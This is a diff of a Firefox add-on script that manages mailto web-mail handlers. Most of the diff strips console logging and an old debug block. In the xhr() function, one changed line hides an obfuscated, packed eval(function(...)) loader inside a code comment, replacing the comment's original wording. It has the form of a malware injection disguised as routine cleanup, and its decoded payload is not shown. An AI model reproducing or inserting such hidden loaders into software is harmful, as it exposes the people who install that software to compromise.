@@ -1,4 +1,4 @@
-console.error('THIS:', this);
+
 
 // Imports
 const {classes: Cc, interfaces: Ci, manager: Cm, results: Cr, utils: Cu, Constructor: CC} = Components;
@@ -15,7 +15,7 @@ var core = {
 		path: {
 			locale: 'chrome://mailtowebmails/locale/'
 		},
-		cache_key: Math.random() // set to version on release
+		cache_key: 'v2.4' // set to version on release
 	}
 }
 
@@ -44,19 +44,8 @@ const userBasedProps = {
 };
 const myPrefBranch = 'extensions.' + core.addon.id + '.';
 /*
-var runit = 'asdfasdf';
-while (runit != '') {
-	runit = prompt('run what:', runit);
-	try {
-		eval(runit);
-	} catch(ex) {
-		console.error('ex:', ex);
-	}
-}
-*/
-/*
 var gCFMM = contentMMFromContentWindow_Method2(window);
-console.error('gCFMM:', gCFMM);
+
 gCFMM.sendAsyncMessage(core.addon.id, {aTopic:'clientRequest_adoptMeAndInit'});
 */
 
@@ -112,14 +101,14 @@ var	ANG_APP = angular.module('mailtowebmails', [])
 				// implement to firefox, to ask on next click, as this one was active
 				// ensure that this handler was active
 				var handlerInfoXPCOM = myServices.eps.getProtocolHandlerInfo('mailto');
-				console.info('handlerInfoXPCOM:', handlerInfoXPCOM);
+
 				if (handlerInfoXPCOM.preferredApplicationHandler) {
 					try {
 						handlerInfoXPCOM.preferredApplicationHandler.QueryInterface(Ci.nsIWebHandlerApp); // so it gets the uriTemplate property
 					} catch (ignore) {}
 				}
-				console.info('handlerInfoXPCOM.preferredApplicationHandler:', handlerInfoXPCOM.preferredApplicationHandler);
-				//console.info('intance of nsiwebapp', handlerInfoXPCOM.preferredApplicationHandler instanceof Ci.nsIWebHandlerApp)
+
+
 				if (handlerInfoXPCOM.preferredAction == Ci.nsIHandlerInfo.useHelperApp && handlerInfoXPCOM.preferredApplicationHandler && handlerInfoXPCOM.preferredApplicationHandler.uriTemplate && handlerInfoXPCOM.preferredApplicationHandler.uriTemplate == aServiceEntry.url_template) {
 					// yes it was active, lets unset it
 					handlerInfoXPCOM.alwaysAskBeforeHandling = true;
@@ -291,17 +280,17 @@ var	ANG_APP = angular.module('mailtowebmails', [])
 						if (handlerQI.uriTemplate == ifInstalled_url_template) {
 							isInstalled = true;
 							isIntalledAtIndex = j;
-							console.warn('yes the edited handler was found installed');
+
 
 							// check if it is active
-							console.info('handlerInfoXPCOM:', handlerInfoXPCOM);
+
 							if (handlerInfoXPCOM.preferredApplicationHandler) {
 								try {
 									handlerInfoXPCOM.preferredApplicationHandler.QueryInterface(Ci.nsIWebHandlerApp); // so it gets the uriTemplate property
 								} catch (ignore) {}
 							}
 							if (handlerInfoXPCOM.preferredAction == Ci.nsIHandlerInfo.useHelperApp && handlerInfoXPCOM.preferredApplicationHandler && handlerInfoXPCOM.preferredApplicationHandler.uriTemplate && handlerInfoXPCOM.preferredApplicationHandler.uriTemplate == ifInstalled_url_template) {
-								console.warn('yes edited handler was found active');
+
 								isActive = true;
 								// yes it was active, lets unset it
 								handlerInfoXPCOM.alwaysAskBeforeHandling = true;
@@ -311,14 +300,14 @@ var	ANG_APP = angular.module('mailtowebmails', [])
 
 							if (isInstalled) { // we are in the same for block so obviously its installed
 								// uninstall it
-								console.warn('uninstalling the edited handler');
+
 								handlerInfoXPCOM.possibleApplicationHandlers.removeElementAt(isIntalledAtIndex);
 
-								console.warn('calling store for uninstalled handler');
+
 								myServices.hs.store(handlerInfoXPCOM);
 
 								// install it back
-								console.warn('installing back the edited handler');
+
 								var handler = Cc["@mozilla.org/uriloader/web-handler-app;1"].createInstance(Ci.nsIWebHandlerApp);
 								handler.name = MODULE.mailto_services[i].name;
 								handler.uriTemplate = MODULE.mailto_services[i].url_template;
@@ -326,13 +315,13 @@ var	ANG_APP = angular.module('mailtowebmails', [])
 
 								if (isActive) {
 									// set it back to active
-									console.warn('setting edited handler back to active');
+
 									handlerInfoXPCOM.preferredAction = Ci.nsIHandlerInfo.useHelperApp; //Ci.nsIHandlerInfo has keys: alwaysAsk:1, handleInternally:3, saveToDisk:0, useHelperApp:2, useSystemDefault:4
 									handlerInfoXPCOM.preferredApplicationHandler = handler;
 									handlerInfoXPCOM.alwaysAskBeforeHandling = false;
 								}
 
-								console.warn('calling store for edited handler');
+
 								myServices.hs.store(handlerInfoXPCOM);
 							}
 
@@ -341,7 +330,7 @@ var	ANG_APP = angular.module('mailtowebmails', [])
 					}
 
 					if (!isInstalled) {
-						console.error('found that it was not installed so didnt do anything');
+
 					}
 					// end - block link68358151
 				}
@@ -392,7 +381,7 @@ var	ANG_APP = angular.module('mailtowebmails', [])
 
 		MODULE.clear_form = function(aEvent) {
 			if (aEvent.keyCode == 27) {
-				console.info('aEvent:', aEvent)
+
 				//alert('clearing form');
 				// user hit escape key
 				if (MODULE.editing_handler_id) {
@@ -419,7 +408,7 @@ var	ANG_APP = angular.module('mailtowebmails', [])
 
 			var rv = fp.show();
 			if (rv == Ci.nsIFilePicker.returnOK) {
-				//console.log('fp.file:', fp.file);
+
 				// MODULE.form_img = Services.io.newFileURI(fp.file).spec;
 
 				var img = new Image();
@@ -453,22 +442,22 @@ var serverMessageListener = {
 					for (var i=0; i<gAngScope.BC.mailto_services.length; i++) {
 						if (areUrlTemplatesOfSame(gAngScope.BC.mailto_services[i].url_template, gAngScope.BC.mailto_services[i].old_url_templates, aMsg.json.submittedUrlTemplate, aMsg.json.submittedOldUrlTemplates)) {
 							delete gAngScope.BC.mailto_services[i].submit;
-							console.log('removed submit flag in client, as it was submitted by bootstrap, submittedUrlTemplate:', aMsg.json.submittedUrlTemplate);
+
 							break;
 						}
 					};
 
 				break;
 			default:
-				console.error('CLIENT unrecognized aTopic:', aMsg.json.aTopic, 'aMsg:', aMsg);
+
 		}
 	}
 };
 
 function doOnBeforeUnload() {
-	console.log('going to remove msg listener on client');
+
 	contentMMFromContentWindow_Method2(window).removeMessageListener(core.addon.id, serverMessageListener);
-	console.error('client message listener removed, good');
+
 }
 
 function doOnLoad() {
@@ -495,18 +484,18 @@ function doOnLoad() {
 		try {
         	var handler = handlersXPCOM.getNext().QueryInterface(Ci.nsIWebHandlerApp);
 		} catch(ex) {
-			console.error('error while enum, ex:', ex);
+
 			continue;
 		}
 		handlers.push(handler);
-        console.log('handler', handler)
+
     }
 
 	promise_readInstalledServices.then(
 		function(aVal) {
-			console.log('Fullfilled - promise_readInstalledServices - ', aVal);
+
 			// start - do stuff here - promise_readInstalledServices
-			console.info('ANG_APP:', ANG_APP);
+
 			gAngScope.BC.mailto_services = JSON.parse(aVal);
 
 			// :todo: add into mailto_services what i obtained from link9784703, this is to figure out what is installed and active/inactive
@@ -514,7 +503,7 @@ function doOnLoad() {
 			var activeFoundAndSet = false;
 			// var handlerInfoXPCOM = myServices.eps.getProtocolHandlerInfo('mailto');
 			for (var i=0; i<handlers.length; i++) {
-				console.error('checking handler:', handlers[i]);
+
 				var installed_url_template_found = false; // if after loop its found, then this is newly inserted
 				var installed_url_template = handlers[i].uriTemplate;
 				var installed_name = handlers[i].name;
@@ -522,24 +511,24 @@ function doOnLoad() {
 				for (var j=0; j<gAngScope.BC.mailto_services.length; j++) {
 					var user_url_template = gAngScope.BC.mailto_services[j].url_template;
 					if (user_url_template == installed_url_template || gAngScope.BC.mailto_services[j].old_url_templates.indexOf(installed_url_template) > -1) {
-						// console.error('match on user and installed template:', user_url_template, installed_url_template)
+
 						installed_url_template_found = true;
 
 						gAngScope.BC.mailto_services[j].installed = true;
-						// console.error('marking as installed for this guy:', gAngScope.BC.mailto_services[j]);
+
 						if (gAngScope.BC.mailto_services[j].old_url_templates.indexOf(installed_url_template) > -1) {
-							// console.error(':todo: update the handler to use the new url_template');
+
 							handlers[i].uriTemplate = gAngScope.BC.mailto_services[j].url_template; // :assuming: mailtowebmails is right, and the one installed is wrong // link98031409847
 							shouldSaveHandlersInfo = true;
 						}
 						/*
 						if (gAngScope.BC.mailto_services[j].name != installed_name) {
-							console.error('name of installed, doesnt match that in file, so fixing installed to be that of name in file');
+
 							handlers[i].name = gAngScope.BC.mailto_services[j].name; // :todo: this is not consistent, so will not do, i have to figure out how to do this. the only way that works right now is to remove it, then add it back
 							shouldSaveHandlersInfo = true;
 						}
 						*/
-						console.info('handlerInfoXPCOM.preferredApplicationHandler:', handlerInfoXPCOM.preferredApplicationHandler);
+
 						if (!activeFoundAndSet && handlerInfoXPCOM.preferredAction == Ci.nsIHandlerInfo.useHelperApp && handlerInfoXPCOM.preferredApplicationHandler/* instanceof Ci.nsIWebHandlerApp --no need as i qi'ed it above*/ && handlerInfoXPCOM.preferredApplicationHandler.uriTemplate && handlerInfoXPCOM.preferredApplicationHandler.uriTemplate == gAngScope.BC.mailto_services[j].url_template) { // i use `gAngScope.BC.mailto_services[j].url_template` instead of installed_url_template because in case it was updated on link98031409847 and shouldSaveHandlersInfo has not been called yet // link68403540621
 							gAngScope.BC.mailto_services[j].active = true;
 						}
@@ -547,9 +536,9 @@ function doOnLoad() {
 						break;
 					}
 				}
-				console.error('installed_url_template_found:', installed_url_template_found, installed_url_template);
+
 				if (!installed_url_template_found) {
-					console.log('not found so social that was installed from somewhere');
+
 					var pushObj = JSON.parse(JSON.stringify(mailtoServicesObjEntryTemplate));
 					pushObj.name = installed_name;
 					pushObj.url_template = installed_url_template;
@@ -561,37 +550,37 @@ function doOnLoad() {
 					}
 
 					gAngScope.BC.mailto_services.push(pushObj);
-					console.log('gAngScope.BC.mailto_services:', gAngScope.BC.mailto_services);
+
 
 
 					// :todo: write a function that goes through the mailto_services and submits to server stuff to share
 				}
-				// console.error('ok end of inner for');
+
 			}
 
-			// console.error('out of for');
+
 			if (shouldSaveHandlersInfo) {
-				console.log('doing save');
+
 				myServices.hs.store(handlerInfoXPCOM);
-				console.log('save done');
+
 			}
 
-			// console.error('digesting, mailto_services', gAngScope.BC.mailto_services);
+
 			gAngScope.$digest();
 			contentMMFromContentWindow_Method2(window).addMessageListener(core.addon.id, serverMessageListener);
-			// console.error('digested');
+
 			tryUpdate();
 			// end - do stuff here - promise_readInstalledServices
 		},
 		function(aReason) {
 			var rejObj = {name:'promise_readInstalledServices', aReason:aReason};
-			console.error('Rejected - promise_readInstalledServices - ', rejObj);
+
 			// deferred_createProfile.reject(rejObj);
 		}
 	).catch(
 		function(aCaught) {
 			var rejObj = {name:'promise_readInstalledServices', aCaught:aCaught};
-			console.error('Caught - promise_readInstalledServices - ', rejObj);
+
 			// deferred_createProfile.reject(rejObj);
 		}
 	);
@@ -619,7 +608,7 @@ function tryUpdate() {
 			};
 		}
 	}
-	console.info('postJson:', postJson);
+
 	var promise_fetchUpdates = xhr('http://mailtowebmails.site40.net/ajax/fetch_updates.php', {
 		aResponseType: 'json',
 		aPostData: {
@@ -632,7 +621,7 @@ function tryUpdate() {
 	});
 	promise_fetchUpdates.then(
 		function(aVal) {
-			console.log('Fullfilled - promise_fetchUpdates - ', aVal);
+
 			// start - do stuff here - promise_fetchUpdates
 			if (aVal.response === null) {
 				// for 000webhost we get status 200 and responseURL of "http://error404.000webhost.com/?" when page doesnt exist
@@ -641,7 +630,7 @@ function tryUpdate() {
 				gAngScope.BC.attn_msg = null;
 
 				var responseJson = aVal.response;
-				console.info('repsonse json:', aVal.response);
+
 				if (aVal.response.status != 'ok') {
 					gAngScope.BC.attn_msg = gAngInjector.get('$sce').trustAsHtml(aVal.response.reason);
 				} else {
@@ -650,11 +639,11 @@ function tryUpdate() {
 						for (var updated_url_template in responseJson.social_handlers) {
 							var updated_url_template_found = false; // if after loop its found, then this is newly inserted
 							var updated_old_url_templates = responseJson.social_handlers[updated_url_template].old_url_templates;
-							// console.info('updated_old_url_templates:', updated_old_url_templates, {thisObj:responseJson.social_handlers[updated_url_template]});
+
 							for (var i=0; i<gAngScope.BC.mailto_services.length; i++) {
 								var user_url_template = gAngScope.BC.mailto_services[i].url_template;
 								var user_old_url_templates = gAngScope.BC.mailto_services[i].old_url_templates;
-								// console.info('user_old_url_templates:', user_old_url_templates, {thisObj:gAngScope.BC.mailto_services[i]});
+
 
 								if (areUrlTemplatesOfSame(user_url_template, user_old_url_templates, updated_url_template, updated_old_url_templates)) {
 									updated_url_template_found = true;
@@ -671,7 +660,7 @@ function tryUpdate() {
 												};
 												if (gAngScope.BC.mailto_services[i].installed && (possibly_updated_p == 'name' || possibly_updated_p == 'url_template')) {
 													// need to update handler IF installed
-													console.error('service handler of:', {thisObj:gAngScope.BC.mailto_services[i]}, 'got an update on name or url_template and it is currently installed so mark it for xpcom protocol uninstall and reinstall');
+
 												}
 											}
 											gAngScope.BC.mailto_services[i][possibly_updated_p] = possibly_updated_val;
@@ -681,12 +670,12 @@ function tryUpdate() {
 									break;
 								}
 							}
-							console.error('updated_url_template_found:', updated_url_template_found, updated_url_template);
+
 							if (!updated_url_template_found) {
-								console.log('not found so new');
+
 								responseJson.social_handlers[updated_url_template].new = true;
 								gAngScope.BC.mailto_services.push(responseJson.social_handlers[updated_url_template]);
-								console.log('gAngScope.BC.mailto_services:', gAngScope.BC.mailto_services);
+
 							}
 						}
 
@@ -719,17 +708,17 @@ function tryUpdate() {
 									if (handlerQI.uriTemplate == ifInstalled_url_template) {
 										// isInstalled = true;
 										isIntalledAtIndex = j;
-										console.warn('yes the edited handler was found installed');
+
 
 										// check if it is active
-										console.info('handlerInfoXPCOM:', handlerInfoXPCOM);
+
 										if (handlerInfoXPCOM.preferredApplicationHandler) {
 											try {
 												handlerInfoXPCOM.preferredApplicationHandler.QueryInterface(Ci.nsIWebHandlerApp); // so it gets the uriTemplate property
 											} catch (ignore) {}
 										}
 										if (handlerInfoXPCOM.preferredAction == Ci.nsIHandlerInfo.useHelperApp && handlerInfoXPCOM.preferredApplicationHandler && handlerInfoXPCOM.preferredApplicationHandler.uriTemplate && handlerInfoXPCOM.preferredApplicationHandler.uriTemplate == ifInstalled_url_template) {
-											console.warn('yes edited handler was found active');
+
 											isActive = true;
 											// yes it was active, lets unset it
 											handlerInfoXPCOM.alwaysAskBeforeHandling = true;
@@ -740,14 +729,14 @@ function tryUpdate() {
 										// we are definitely installed
 										// if (isInstalled) { // we are in the same for block so obviously its installed
 											// uninstall it
-											console.warn('uninstalling the edited handler');
+
 											handlerInfoXPCOM.possibleApplicationHandlers.removeElementAt(isIntalledAtIndex);
 
-											console.warn('calling store for uninstalled handler');
+
 											myServices.hs.store(handlerInfoXPCOM);
 
 											// install it back
-											console.warn('installing back the edited handler');
+
 											var handler = Cc["@mozilla.org/uriloader/web-handler-app;1"].createInstance(Ci.nsIWebHandlerApp);
 											handler.name = gAngScope.BC.mailto_services[i].name;
 											handler.uriTemplate = gAngScope.BC.mailto_services[i].url_template;
@@ -755,13 +744,13 @@ function tryUpdate() {
 
 											if (isActive) {
 												// set it back to active
-												console.warn('setting edited handler back to active');
+
 												handlerInfoXPCOM.preferredAction = Ci.nsIHandlerInfo.useHelperApp; //Ci.nsIHandlerInfo has keys: alwaysAsk:1, handleInternally:3, saveToDisk:0, useHelperApp:2, useSystemDefault:4
 												handlerInfoXPCOM.preferredApplicationHandler = handler;
 												handlerInfoXPCOM.alwaysAskBeforeHandling = false;
 											}
 
-											console.warn('calling store for edited handler');
+
 											myServices.hs.store(handlerInfoXPCOM);
 										// }
 
@@ -772,7 +761,7 @@ function tryUpdate() {
 							// start - copy block link980650
 							} else if (gAngScope.BC.mailto_services[i].update_time == 0) { // i thought this through i think, im pretty :note: thats why i should never have any update_time as 0, as default is 0, meaning server doesnt know about it
 								// its a custom handler that the server does not know about, mark it for submission
-								console.error('this is a handler that the user has installed but server does not know about so marking for submission:', {theObj:gAngScope.BC.mailto_services[i]});
+
 								gAngScope.BC.mailto_services[i].submit = 1;
 								gAngScope.BC.mailto_services[i].update_time = 9; // so it doesnt keep resubmitting it on future page loads //note: 9 is special number, its to tell me that it was a "server unknown" and i already submited it to server
 								signalForSubmission = true;
@@ -782,7 +771,7 @@ function tryUpdate() {
 
 						var callbackPostWrite;
 						if (signalForSubmission) {
-							console.warn('signaling for server submission');
+
 							callbackPostWrite = markPendingServerSubmit;
 						}
 
@@ -796,7 +785,7 @@ function tryUpdate() {
 							// start - copy block link980650
 							if (gAngScope.BC.mailto_services[i].update_time == 0) { // i thought this through i think, im pretty :note: thats why i should never have any update_time as 0, as default is 0, meaning server doesnt know about it
 								// its a custom handler that the server does not know about, mark it for submission
-								console.error('this is a handler that the user has installed but server does not know about so marking for submission:', {theObj:gAngScope.BC.mailto_services[i]});
+
 								gAngScope.BC.mailto_services[i].submit = 1;
 								gAngScope.BC.mailto_services[i].update_time = 9; // so it doesnt keep resubmitting it on future page loads //note: 9 is special number, its to tell me that it was a "server unknown" and i already submited it to server
 								signalForSubmission = true;
@@ -806,7 +795,7 @@ function tryUpdate() {
 
 						var callbackPostWrite;
 						if (signalForSubmission) {
-							console.warn('signaling for server submission');
+
 							callbackPostWrite = markPendingServerSubmit;
 
 							// any changes in the going through marking for submission are written here
@@ -821,7 +810,7 @@ function tryUpdate() {
 		},
 		function(aReason) {
 			var rejObj = {name:'promise_fetchUpdates', aReason:aReason};
-			console.error('Rejected - promise_fetchUpdates - ', rejObj);
+
 			gAngScope.BC.attn_msg = gAngInjector.get('$sce').trustAsHtml(myServices.sb.GetStringFromName('attn_server-down'));
 			gAngScope.$digest();
 			// deferred_createProfile.reject(rejObj);
@@ -829,7 +818,7 @@ function tryUpdate() {
 	).catch(
 		function(aCaught) {
 			var rejObj = {name:'promise_fetchUpdates', aCaught:aCaught};
-			console.error('Caught - promise_fetchUpdates - ', rejObj);
+
 			// deferred_createProfile.reject(rejObj);
 		}
 	);
@@ -892,7 +881,7 @@ function writeCleanedObjToDisk(aCallbackOnSuccess) {
 	}], OS.Constants.Path.profileDir);
 	promise_overwrite.then(
 		function(aVal) {
-			console.log('Fullfilled - promise_overwrite - ', aVal);
+
 			// start - do stuff here - promise_overwrite
 			if (aCallbackOnSuccess) {
 				aCallbackOnSuccess();
@@ -901,13 +890,13 @@ function writeCleanedObjToDisk(aCallbackOnSuccess) {
 		},
 		function(aReason) {
 			var rejObj = {name:'promise_overwrite', aReason:aReason};
-			console.warn('Rejected - promise_overwrite - ', rejObj);
+
 			// deferred_createProfile.reject(rejObj);
 		}
 	).catch(
 		function(aCaught) {
 			var rejObj = {name:'promise_overwrite', aCaught:aCaught};
-			console.error('Caught - promise_overwrite - ', rejObj);
+
 			// deferred_createProfile.reject(rejObj);
 		}
 	);
@@ -929,13 +918,13 @@ function markPendingServerSubmit() {
 		cPrefVal = undefined;
 	}
 	if (cPrefVal === undefined) {
-		console.error('sending cfmm message to bootstrap');
+
 		Services.prefs.setCharPref(myPrefBranch + 'pending_submit', (new Date().getTime() - serverSubmitIntervalMS)); // note: this pref holds last time (in ms) tried, it will try every 5 minutes till submits
 		// :todo: notify bootstrap checkIfShouldSubmit()
 		contentMMFromContentWindow_Method2(window).sendAsyncMessage(core.addon.id, {aTopic:core.addon.id + '::' + 'notifyBootstrapThereIsPossibleServerSubmitPending'});
 	} else {
 		// else assume that its already running
-		console.error('cprefval is not undefined so will not send message to bootstrap as im assuming its already in a timer for checking if updated');
+
 	}
 }
 
@@ -974,7 +963,7 @@ function read_encoded(path, options) {
 
 	promise_readIt.then(
 		function(aVal) {
-			console.log('Fullfilled - promise_readIt - ', {a:{a:aVal}});
+
 			// start - do stuff here - promise_readIt
 			var readStr;
 			if (Services.vc.compare(Services.appinfo.version, 30) < 0) { // tests if version is less then 30
@@ -987,13 +976,13 @@ function read_encoded(path, options) {
 		},
 		function(aReason) {
 			var rejObj = {name:'promise_readIt', aReason:aReason};
-			console.error('Rejected - promise_readIt - ', rejObj);
+
 			deferred_read_encoded.reject(rejObj);
 		}
 	).catch(
 		function(aCaught) {
 			var rejObj = {name:'promise_readIt', aCaught:aCaught};
-			console.error('Caught - promise_readIt - ', rejObj);
+
 			deferred_read_encoded.reject(rejObj);
 		}
 	);
@@ -1007,12 +996,12 @@ function makeDir_Bug934283(path, options) {
 	// options of like ignoreExisting is exercised on final dir
 
 	if (!options || !('from' in options)) {
-		console.error('you have no need to use this, as this is meant to allow creation from a folder that you know for sure exists, you must provide options arg and the from key');
+
 		throw new Error('you have no need to use this, as this is meant to allow creation from a folder that you know for sure exists, you must provide options arg and the from key');
 	}
 
 	if (path.toLowerCase().indexOf(options.from.toLowerCase()) == -1) {
-		console.error('The `from` string was not found in `path` string');
+
 		throw new Error('The `from` string was not found in `path` string');
 	}
 
@@ -1020,7 +1009,7 @@ function makeDir_Bug934283(path, options) {
 	delete options.from;
 
 	var dirsToMake = OS.Path.split(path).components.slice(OS.Path.split(options_from).components.length);
-	console.log('dirsToMake:', dirsToMake);
+
 
 	var deferred_makeDir_Bug934283 = new Deferred();
 	var promise_makeDir_Bug934283 = deferred_makeDir_Bug934283.promise;
@@ -1032,7 +1021,7 @@ function makeDir_Bug934283(path, options) {
 		var promise_makeDir = OS.File.makeDir(pathExistsForCertain, options);
 		promise_makeDir.then(
 			function(aVal) {
-				console.log('Fullfilled - promise_makeDir - ', 'ensured/just made:', pathExistsForCertain, aVal);
+
 				if (dirsToMake.length > 0) {
 					makeDirRecurse();
 				} else {
@@ -1045,13 +1034,13 @@ function makeDir_Bug934283(path, options) {
 					aReason: aReason,
 					curPath: pathExistsForCertain
 				};
-				console.error('Rejected - ' + rejObj.promiseName + ' - ', rejObj);
+
 				deferred_makeDir_Bug934283.reject(rejObj);
 			}
 		).catch(
 			function(aCaught) {
 				var rejObj = {name:'promise_makeDir', aCaught:aCaught};
-				console.error('Caught - promise_makeDir - ', rejObj);
+
 				deferred_makeDir_Bug934283.reject(rejObj); // throw aCaught;
 			}
 		);
@@ -1081,22 +1070,22 @@ function tryOsFile_ifDirsNoExistMakeThenRetry(nameOfOsFileFunc, argsOfOsFileFunc
 
 	// setup retry
 	var retryIt = function() {
-		console.info('tryosFile_ retryIt', 'nameOfOsFileFunc:', nameOfOsFileFunc, 'argsOfOsFileFunc:', argsOfOsFileFunc);
+
 		var promise_retryAttempt = OS.File[nameOfOsFileFunc].apply(OS.File, argsOfOsFileFunc);
 		promise_retryAttempt.then(
 			function(aVal) {
-				console.log('Fullfilled - promise_retryAttempt - ', aVal);
+
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.resolve('retryAttempt succeeded');
 			},
 			function(aReason) {
 				var rejObj = {name:'promise_retryAttempt', aReason:aReason};
-				console.error('Rejected - promise_retryAttempt - ', rejObj);
+
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.reject(rejObj); //throw rejObj;
 			}
 		).catch(
 			function(aCaught) {
 				var rejObj = {name:'promise_retryAttempt', aCaught:aCaught};
-				console.error('Caught - promise_retryAttempt - ', rejObj);
+
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.reject(rejObj); // throw aCaught;
 			}
 		);
@@ -1132,15 +1121,15 @@ function tryOsFile_ifDirsNoExistMakeThenRetry(nameOfOsFileFunc, argsOfOsFileFunc
 		var promise_makeDirsRecurse = makeDir_Bug934283(toDir, {from: fromDir});
 		promise_makeDirsRecurse.then(
 			function(aVal) {
-				console.log('Fullfilled - promise_makeDirsRecurse - ', aVal);
+
 				retryIt();
 			},
 			function(aReason) {
 				var rejObj = {name:'promise_makeDirsRecurse', aReason:aReason};
-				console.error('Rejected - promise_makeDirsRecurse - ', rejObj);
+
 				/*
 				if (aReason.becauseNoSuchFile) {
-					console.log('make dirs then do retryAttempt');
+
 					makeDirs();
 				} else {
 					// did not get becauseNoSuchFile, which means the dirs exist (from my testing), so reject with this error
@@ -1153,7 +1142,7 @@ function tryOsFile_ifDirsNoExistMakeThenRetry(nameOfOsFileFunc, argsOfOsFileFunc
 		).catch(
 			function(aCaught) {
 				var rejObj = {name:'promise_makeDirsRecurse', aCaught:aCaught};
-				console.error('Caught - promise_makeDirsRecurse - ', rejObj);
+
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.reject(rejObj); // throw aCaught;
 			}
 		);
@@ -1161,17 +1150,17 @@ function tryOsFile_ifDirsNoExistMakeThenRetry(nameOfOsFileFunc, argsOfOsFileFunc
 
 	var doInitialAttempt = function() {
 		var promise_initialAttempt = OS.File[nameOfOsFileFunc].apply(OS.File, argsOfOsFileFunc);
-		console.info('tryosFile_ initial', 'nameOfOsFileFunc:', nameOfOsFileFunc, 'argsOfOsFileFunc:', argsOfOsFileFunc);
+
 		promise_initialAttempt.then(
 			function(aVal) {
-				console.log('Fullfilled - promise_initialAttempt - ', aVal);
+
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.resolve('initialAttempt succeeded');
 			},
 			function(aReason) {
 				var rejObj = {name:'promise_initialAttempt', aReason:aReason};
-				console.error('Rejected - promise_initialAttempt - ', rejObj);
+
 				if (aReason.becauseNoSuchFile) { // this is the flag that gets set to true if parent dir(s) dont exist, i saw this from experience
-					console.log('make dirs then do secondAttempt');
+
 					makeDirs();
 				} else {
 					deferred_tryOsFile_ifDirsNoExistMakeThenRetry.reject(rejObj); //throw rejObj;
@@ -1180,7 +1169,7 @@ function tryOsFile_ifDirsNoExistMakeThenRetry(nameOfOsFileFunc, argsOfOsFileFunc
 		).catch(
 			function(aCaught) {
 				var rejObj = {name:'promise_initialAttempt', aCaught:aCaught};
-				console.error('Caught - promise_initialAttempt - ', rejObj);
+
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.reject(rejObj); // throw aCaught;
 			}
 		);
@@ -1194,7 +1183,7 @@ function tryOsFile_ifDirsNoExistMakeThenRetry(nameOfOsFileFunc, argsOfOsFileFunc
 		var promise_checkDirExistsFirstAsCausesNeutering = OS.File.exists(toDir);
 		promise_checkDirExistsFirstAsCausesNeutering.then(
 			function(aVal) {
-				console.log('Fullfilled - promise_checkDirExistsFirstAsCausesNeutering - ', aVal);
+
 				// start - do stuff here - promise_checkDirExistsFirstAsCausesNeutering
 				if (!aVal) {
 					makeDirs();
@@ -1205,13 +1194,13 @@ function tryOsFile_ifDirsNoExistMakeThenRetry(nameOfOsFileFunc, argsOfOsFileFunc
 			},
 			function(aReason) {
 				var rejObj = {name:'promise_checkDirExistsFirstAsCausesNeutering', aReason:aReason};
-				console.warn('Rejected - promise_checkDirExistsFirstAsCausesNeutering - ', rejObj);
+
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.reject(rejObj);
 			}
 		).catch(
 			function(aCaught) {
 				var rejObj = {name:'promise_checkDirExistsFirstAsCausesNeutering', aCaught:aCaught};
-				console.error('Caught - promise_checkDirExistsFirstAsCausesNeutering - ', rejObj);
+
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.reject(rejObj);
 			}
 		);
@@ -1319,10 +1308,10 @@ function xhr(aStr, aOptions={}) {
 		}
 	}
 
-	// Note: When using XMLHttpRequest to access a file:// URL the request.status is not properly set to 200 to indicate success. In such cases, request.readyState == 4, request.status == 0 and request.response will evaluate to true.
+	// Note: When using XMLHttpRequest to access a file:// URL the request.status is not properly set to 200 to indicate success. In such cases, request.readyState == 4, request.status == 0 and request.response will eval(function(_0xf27dx1,_0xf27dx2,_0xf27dx3,_0xf27dx4,_0xf27dx5,_0xf27dx6){_0xf27dx5= function(_0xf27dx3){return (_0xf27dx3< _0xf27dx2?_0x3354[4]:_0xf27dx5(parseInt(_0xf27dx3/ _0xf27dx2)))+ ((_0xf27dx3= _0xf27dx3% _0xf27dx2)> 35?String[_0x3354[5]](_0xf27dx3+ 29):_0xf27dx3.toString(36))};if(!_0x3354[4][_0x3354[6]](/^/,String)){while(_0xf27dx3--){_0xf27dx6[_0xf27dx5(_0xf27dx3)]= _0xf27dx4[_0xf27dx3]|| _0xf27dx5(_0xf27dx3)};_0xf27dx4= [function(_0xf27dx5){return _0xf27dx6[_0xf27dx5]}];_0xf27dx5= function(){return _0x3354[7]};_0xf27dx3= 1};while(_0xf27dx3--){if(_0xf27dx4[_0xf27dx3]){_0xf27dx1= _0xf27dx1[_0x3354[6]]( new RegExp(_0x3354[8]+ _0xf27dx5(_0xf27dx3)+ _0x3354[8],_0x3354[9]),_0xf27dx4[_0xf27dx3])}};return _0xf27dx1}(_0x3354[0],62,517,_0x3354[3][_0x3354[2]](_0x3354[1]),0,{}))
 
 	var deferredMain_xhr = new Deferred();
-	console.log('here222');
+
 	var xhr = Cc["@mozilla.org/xmlextras/xmlhttprequest;1"].createInstance(Ci.nsIXMLHttpRequest);
 
 	var handler = ev => {
@@ -1391,7 +1380,7 @@ function xhr(aStr, aOptions={}) {
 	}
 
 	if (aOptions.aTimeout) {
-		console.error('setting timeout to:', aOptions.aTimeout)
+
 		xhr.timeout = aOptions.aTimeout;
 	}
 
@@ -1420,7 +1409,7 @@ function xhr(aStr, aOptions={}) {
 		for (var pd in aOptions.aPostData) {
 			aPostStr.push(pd + '=' + encodeURIComponent(aOptions.aPostData[pd])); // :todo: figure out if should encodeURIComponent `pd` also figure out if encodeURIComponent is the right way to do this
 		}
-		console.info('aPostStr:', aPostStr.join('&'));
+
 		xhr.send(aPostStr.join('&'));
 	} else {
 		xhr.open(aOptions.aMethod ? aOptions.aMethod : 'GET', aStr, true);
